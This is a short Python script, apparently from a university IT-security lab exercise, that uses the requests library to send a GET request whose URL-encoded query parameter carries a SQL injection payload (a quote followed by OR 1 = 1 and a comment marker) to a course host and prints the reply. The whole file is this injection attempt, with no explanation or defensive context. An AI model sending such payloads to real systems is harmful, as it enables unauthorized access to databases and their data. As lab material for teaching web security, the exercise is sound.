import requests

with requests.Session() as sess:
    response = sess.get("https://t3.itsec.sec.in.tum.de/?q=%22%27+OR+1+%3D+1+--+%27")
    print(response.text)
